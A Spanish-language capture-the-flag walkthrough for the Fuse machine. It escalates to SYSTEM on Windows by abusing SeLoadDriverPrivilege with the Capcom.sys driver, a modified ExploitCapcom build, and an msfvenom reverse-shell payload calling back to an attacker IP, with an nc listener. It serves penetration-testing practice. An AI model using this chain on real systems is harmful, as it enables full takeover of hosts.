## Privilege Escalation {-}

### Rootear la maquina {-}

Enumeamos los privilegios del ususarios

```bash
whoami /priv
whoami /all
```

Vemos quel usuario tiene un privilegio **SeLoadDriverPrivilege**. Miramos en la web si se puede escalar privilegios con
esto. 

En firefox buscamos con *SeLoadDriverPrivilege exploit* y caemos en la web de [tarlogic](https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/).

Aqui S4vitar nos recomienda trabajar desde una maquina Windows con Visual studio 19 installado para buildear el exploit.

#### Crando el exploit LoadDriver.exe desde la maquina windows {-}

1. creamos una carpeta de trabajo llamado fuse
1. desde visual studio creamos un nuevo proyecto llamado LoadDriver de typo Console App
1. copiamos el contenido del fichero [eoploaddriver](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp) en el ficher *Source Files/LoadDriver.cpp* del proyecto.
1. eliminamos el primer include que nos da un error *#include "stdafx.h* y que no es necessario
1. en visual studio cambiamos el Debug a Realease y le ponemos x64

    ```{r, echo = FALSE, fig.cap="Build LoadDriver", out.width="90%"}
        knitr::include_graphics("images/Fuse-VS2019.png")
    ```
1. en el menu le damos a Build -> Rebuild solution

Esto nos cree un fichero LoadDriver.exe que copiamos en una carpeta compiledbinaries.

#### Recuperamos el capcom.sys {-}

En la web de tarlogic nos dice que necessitamos un fichero llamado *capcom.sys* lo descargamos desde la [web](https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys) y la copiamos
en la carpeta compiledbinaries.

#### Creamos el ExploitCapcom.exe {-}

En este punto nos tenemos que descargar el fichero **ExploitCapcom**. Este fichero se tiene que compilar desde Visual Studio.

1. descargamos el proyecto

    ```bash
    git clone https://github.com/tandasat/ExploitCapcom
    ```

1. desde Visual Studio le damos a File -> Open -> Project/Solution
1. buscamos el .sln y le damos a open

Si abrimos el fichero ExploitCapcom.cpp, la idea aqui seria de modificar el script para que ejecute un binario malicioso creado con *msfvenom*. 
Para esto necesitamos modificar la funccion **launchSell()** del ExploitCapcom.cpp

En la web de [AppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList), buscamos una routa windows interesante donde se puede trabajar
sin problemas, en este caso seria la `C:\Windows\System32\spool\drivers\color`

1. Modificamos el script

    ```cpp
    static bool launchSell()
    {
        TCHAR CommandLine[] = TEXT("C:\\Windows\\System32\\spool\\drivers\\color\\reverse.exe");
    }
    ```

1. Buildeamos el proyecto dandole al menu Build -> Rebuild solution
1. copiamos el fichero ExploitCapcom.exe en la carpeta compiledbinaries


#### Passamos los ficheros a la maquina victima {-}

En la carpeta `compiledbinaries` tenemos nuestros 3 ficheros necesarios para el exploit.
- Capcom.sys
- ExploitCapcom.exe
- LoadDriver.exe

En esta carpeta, montamos un servidor web con python

```bash
python3 -m http.server
```

Desde la maquina de atacante, descargamos estos ficheros

```bash
wget http://192.168.1.14:8000/Capcom.sys
wget http://192.168.1.14:8000/ExploitCapcom.exe
wget http://192.168.1.14:8000/LoadDriver.exe
```

Creamos el reverse.exe con msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o reverse.exe
```

Desde la consola Evil-WinRM de la maquina victima, subimos todo los ficheros

```bash
cd C:\Windows\Temp
upload Capcom.sys
upload ExploitCapcom.exe
upload LoadDriver.exe
cd C:\Windows\System32\spool\drivers\color
upload reverse.exe
```

#### Lanzamos el exploit {-}

En la maquina de atacante nos ponemos en escucha en el puerto 443

```bash
rlwrap nc -nlvp 443
```

En la maquina victima, lanzamos el exploit

```bash
cd C:\Windows\Temp
C:\Windows\Temp\LoadDriver.exe System\CurrentControlSet\savishell C:\Windows\Temp\Capcom.sys
C:\Windows\Temp\ExploitCapcom.exe
```

La reverse shell nos a funccionado y con `whoami` vemos que ya somos nt authority\system y podemos ver la flag.